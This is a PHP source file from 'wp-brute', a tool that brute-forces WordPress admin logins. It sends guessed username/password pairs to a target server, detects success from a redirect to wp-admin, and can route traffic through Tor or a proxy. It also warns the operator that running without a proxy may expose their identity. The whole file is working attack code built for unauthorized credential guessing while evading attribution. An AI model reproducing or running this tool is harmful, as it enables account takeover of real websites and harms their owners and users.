<?php

function wpbrute_log($sMessage) {
	
	global $wpbrute_log;
	
	if ( !$wpbrute_log['fh'] ) {
		$wpbrute_log['fh'] = fopen("log/".date("h-i-s-d-m-Y").".log",'a');
	}
	
	//Write to the log.
	fwrite($wpbrute_log['fh'],$sMessage."\n");
	
	print($sMessage."\n");
	
}

function wpbrute_die($sMessage) {
	
	global $wpbrute_log;
	
	if ( $wpbrute_log['fh'] ) {
		fclose($wpbrute_log['fh']);
	}
	
	die($sMessage."\n");
	
}

function wpbrute_try($sUser,$sPass) {
	
	global $socket, $wpbrute;
	$packet_buffer = wpbrute_packet($sUser,$sPass);
	
	//Make a connection
	$socket = fsockopen($wpbrute['target_ip'], 80);
	if (!$socket) {
		wpbrute_log("Couldn't make connection to ".$wpbrute['target_ip'].":80");
		wpbrute_die("Fatal error. Closing.");
	}
	
	//Post the packet header.
	fwrite($socket,$packet_buffer['header']);
	
	//Post the post data.
	fwrite($socket,$packet_buffer['data']);
	
	$buffer = null;

	// Keep fetching lines until response code is correct
	while ($line = fgets($socket)) {
		$buffer .= $line;
	}
	
	//Check for a password match.
	if (strpos($buffer, 'Location: '.$wpbrute['target_wpadmin']) != null) {
		return 1;
	} else {
		return -2;
	}
	
	
}

function wpbrute_try_tor($sUser,$sPass) {
	
	
	
	global $socket, $wpbrute;
	$packet_buffer = wpbrute_packet($sUser,$sPass);
	
	//Make a connection
	$socket = new Torsocket($wpbrute['target_ip'], 80,false,$wpbrute['proxy_port'],$wpbrute['proxy_ip']);
	if ($socket->error == 1) {
		wpbrute_log("Couldn't make connection to ".$wpbrute['target_ip'].":80 (Via tor / proxy)");
		wpbrute_die("Fatal error. Closing.");
	}

	//Post the packet header.
	$socket->fwrite($packet_buffer['header']);
	
	//Post the post data.
	$socket->fwrite($packet_buffer['data']);
	
	$buffer = null;

	$time_buffer = time();
	// Keep fetching lines until response code is correct
	while (1) {
		
		if(time() > $time_buffer + 30) {
			//Timeout
			wpbrute_log("Timeout. Retrying.");
			return -1;
		}
		
		$line = $socket->fread(1024);
		if ($line) {
			$buffer .= $line;
			if (strpos($buffer,"</html>") > 0) {
				return -2;
			} else if (strpos($buffer,'Location: '.$wpbrute['target_wpadmin']) > 0) {
				return 1;
			}
		}
	}
	
}

function wpbrute_localwarn() {
	wpbrute_log("Warning: wp-brute running without a proxy. Your identity may be compromised.");
	print("\n\n\n---WARNING---\n\nWp-Brute is running locally without a proxy and your idendtity is not masked.\nYou have 5 seconds to cancel by pressing CTRL + C.\n\n\n");
	sleep(5);
}

?>